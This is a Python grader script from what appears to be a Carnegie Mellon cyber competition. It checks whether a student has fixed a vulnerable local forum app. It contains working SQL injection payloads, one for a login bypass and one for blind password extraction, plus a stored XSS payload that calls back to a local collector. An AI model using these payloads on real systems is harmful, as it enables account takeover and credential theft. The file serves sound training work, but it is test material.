#!/usr/bin/python3

# Copyright 2022 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import secrets
import time
import os
import requests
from bs4 import BeautifulSoup
import os.path
import warnings
from selenium import webdriver
from selenium.webdriver import FirefoxOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait

warnings.filterwarnings("ignore", category=DeprecationWarning)

cookieFile = 'prescup.cookies'
baseUrl = 'http://localhost:5000/'
loginUrl = baseUrl + 'login'
username = 'student'
password = 'tartans'

def parseCsrfToken( text ):
    soup = BeautifulSoup( text, 'html.parser' )
    return soup.find( 'input', {'name':'CSRFToken'} )['value']

def canLogin( session ):
    postData = { 'username': 'student', 'password': 'tartans' }
    page = session.post( loginUrl, data = postData )
    if 'You are logged in as' in page.text:
        return True
    return False

def canPost( session ):
    body = 'evaluation test post'
    title = 'evaluation post title'
    postData = { 'title': 'evaluation post title', 'body': body }
    page = session.post( baseUrl + 'post', data = postData )

    if title in page.text and body in page.text:
        # TODO parse out post ID and then call /remove to delete it
        postId = page.url.rsplit( '/', 1 )[-1]
        return ( True, postId )
    return ( False, -1 )

def canBrowse( session ):
    page = session.get( baseUrl + 'threads' )
    if 'Thread List' in page.text:
        return True
    return False

def canLogout( session ):
    page = session.get( baseUrl + 'logout' )
    if 'Please' in page.text:
        return True
    return False

def canReply( session, postId ):
    replyBody = 'evaluation post reply body'
    postData = { 'body': replyBody, 'threadId': postId }
    page = session.post( baseUrl + 'reply', data = postData )
    if replyBody in page.text:
        return True
    return False

def isOnline( session ):
    page = session.get( baseUrl )
    if "hanging out and being chill" in page.text:
        return True
    return False

def recoverPassword( session, threadId ):

    # TODO make sure thread 1 exists first
    user = username
    attackUrl = baseUrl + "/thread/" + threadId + " and substring((select password from user where username = '" + user + "'),{pos:d},1) > '{c}'; -- "
    attackLen = baseUrl + "/thread/" + threadId + " and (select char_length( password ) from user where username = '" + user + "') > {length:d};-- "

    length = 1
    while 'thread not found' not in session.get( attackLen.format( length = length ) ).text:
        length = length + 1
        if length > 255: #password cant be this long
            return False

    p = ''
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

    for i in range( length ):
        j = 0
        while 'thread not found' not in session.get( attackUrl.format( pos = i + 1, c = charset[j] ) ).text:
            j = j + 1
        p = p + charset[j]
    if p == 'tartans':
        return True
    return False


def checkLoginInjection( session ):
    loginPayload = { 'username': "a' or 1=1 limit 2, 29; -- ", 'password': 'hello' }
    page = session.post( loginUrl, data = loginPayload )

    if "You are logged in as" in page.text:
        return True
    return False

def xssAttack( session ):
    if not canLogin( session ):
        return False

    nonce = secrets.token_hex( 8 )
    postId = -1
    body = "<img src=\"none\" onerror=\"this.src='http://localhost:5100/monster?c={}';\" /> ".format( nonce )
    title = 'evaluation attack post title'
    postData = { 'title': title, 'body': body }
    page = session.post( baseUrl + 'post', data = postData )
    if title in page.text:
        postId = page.url.rsplit( '/', 1 )[-1]
    else:
        print( page.text )
        return False

    opts = FirefoxOptions()
    opts.add_argument('--headless')

    with webdriver.Firefox( executable_path='./geckodriver', service_log_path='./geckodriver.log', options=opts ) as driver:
        driver.set_page_load_timeout( 4 )
        wait = WebDriverWait( driver, 10 )
        driver.get( loginUrl )
        driver.find_element( By.NAME, "username" ).send_keys( username )
        driver.find_element( By.NAME, "password" ).send_keys( password + Keys.RETURN )
        try:
            driver.get( baseUrl + "thread/" + postId )
            time.sleep( 3 )
        except TimeoutException:
            pass
        driver.quit()

    session.get( baseUrl + 'delete/' + postId )

    try:
        with open('/tmp/defend.txt') as f:
            for line in f:
                pass
            last_line = line
            if nonce in last_line:
                return True
    except OSError as e:
        return False

    return False

def makeAnswer( msg ):
    file1 = open("/tmp/status.txt", "w")  # overwrite mode
    file1.write( msg + "\n")
    file1.close()

def appendAnswer( msg ):
    file1 = open("/tmp/status.txt", "a")  # append mode
    file1.write( msg + "\n")
    file1.close()


def runTests():
    try:
        with requests.Session() as session:
            isOnlineResult = isOnline( session )
            canLoginResult = canLogin( session )
            ( canPostResult, postId ) = canPost( session )
            canBrowseResult = canBrowse( session )
            canReplyResult = canReply( session, postId )
            canLogoutResult = canLogout( session )

            if isOnline and canPostResult and canBrowseResult and canReplyResult and canLogoutResult and canLoginResult:
                print( "CoreFeatures: Success" )
            else:
                if int( postId ) >= 0:
                    session.get( baseUrl + 'delete/' + postId )
                print( "CoreFeatures: Fail -- Restore core functionality and correct vulnerabilities." )
                return False

            loginInjectionWorks = checkLoginInjection( session )
            if loginInjectionWorks:
                print( "VulnA: Failure" )
            else:
                print( "VulnA: Success" )
        
            canRecoverPassword = recoverPassword( session, postId )
            if canRecoverPassword:
                print( "VulnB: Failure" )
            else:
                print( "VulnB: Success" )

            canXss = xssAttack( session )
            if canXss:
                print( "VulnC: Failure" )
            else:
                print( "VulnC: Success" )

            if int( postId ) >= 0:
                session.get( baseUrl + 'delete/' + postId )
    except Exception as e:
        print(e)
        print( "CoreFeatures: Fail -- Restore core functionality and correct vulnerabilities." )
        print( "VulnA: Failure" )
        print( "VulnB: Failure" )
        print( "VulnC: Failure" )

if __name__ == '__main__':
    runTests()
    os.system("rm /tmp/defend.txt")
